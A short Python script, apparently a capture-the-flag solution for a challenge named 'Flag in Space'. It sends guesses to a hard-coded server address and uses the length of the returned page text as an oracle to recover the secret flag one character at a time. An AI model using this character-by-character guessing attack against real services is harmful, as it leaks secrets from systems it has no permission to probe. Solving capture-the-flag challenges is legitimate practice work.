import requests
from string import printable
from bs4 import BeautifulSoup

url = "http://172.105.154.14/?flag={}"

flag = "shctf{"

while(flag[-1] != "}"):
    for c in printable:
        cur_flag = flag + c
        print("[*] Trying: ", cur_flag)
        cur_url = url.format(cur_flag)
        r = requests.get(cur_url)
        soup = BeautifulSoup(r.text, 'lxml')
        a = soup.get_text()
        a = a.replace("Flag in Space", "").replace("\n", "")
        if(len(a) == len(flag) + 1):
            flag = a
            print(flag)
            break



